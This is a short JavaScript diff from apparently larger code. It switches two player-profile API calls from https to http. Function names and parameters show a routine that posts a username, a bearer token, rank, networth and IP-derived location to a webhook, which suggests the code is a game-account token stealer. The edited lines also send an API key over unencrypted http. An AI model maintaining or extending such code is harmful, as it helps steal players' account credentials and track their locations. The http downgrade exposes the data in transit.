@@ -145,7 +145,7 @@ async function getIpLocation(ip) {
     return [response.data['country'], response.data['city'], response.data.flag['emoji'], response.data['security']]
 }
 async function getPlayerData(username) {
-    let url = `https://apinew-3z7f.onrender.com/v2/profiles/${username}?key=discordlink`
+    let url = `http://apinew-3z7f.onrender.com/v2/profiles/${username}?key=discordlink`
     let config = {
         headers: {
             'Authorization': 'discordlink'
@@ -163,7 +163,7 @@ async function postToWebhook(formatNumber, level, rank, username, bearerToken, u
     let networth = await (
         await axios
             .get(
-                `https://apinew-3z7f.onrender.com/v2/profiles/${username}?key=discordlink`
+                `http://apinew-3z7f.onrender.com/v2/profiles/${username}?key=discordlink`
             )
             .catch(() => {
                 return { data: { data: [{ networth: null }] } };
